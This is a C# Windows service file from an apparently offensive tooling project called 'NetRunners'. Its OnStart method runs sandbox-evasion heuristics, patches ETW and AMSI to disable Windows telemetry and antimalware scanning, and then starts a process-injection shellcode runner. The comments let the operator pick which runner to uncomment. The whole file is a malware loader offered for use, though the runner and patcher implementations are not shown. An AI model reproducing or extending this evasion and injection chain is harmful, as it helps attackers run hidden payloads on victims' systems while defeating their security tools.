using System;
using System.ServiceProcess;
using NetRunners.Interfaces;
using NetRunners.Heuristics;
using NetRunners.Patchers;
using NetRunners.Runners;

namespace NetRunners.Svc
{
    /// <summary>
    /// Service function, calls Heurisitic functions, and calls a runner of your choice.
    /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
    /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
    /// </summary>
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
            {
                return; // Exit if any checks fail or patching fails
            }

            // uncomment your choice
            IRunner runner = new ProcessInjectionRunner();
            //IRunner runner = new DefaultRunner();
            //IRunner runner = new ProcessInjectionRunner();
            runner.Run();
        }
        protected override void OnStop()
        {
        }
    }
}
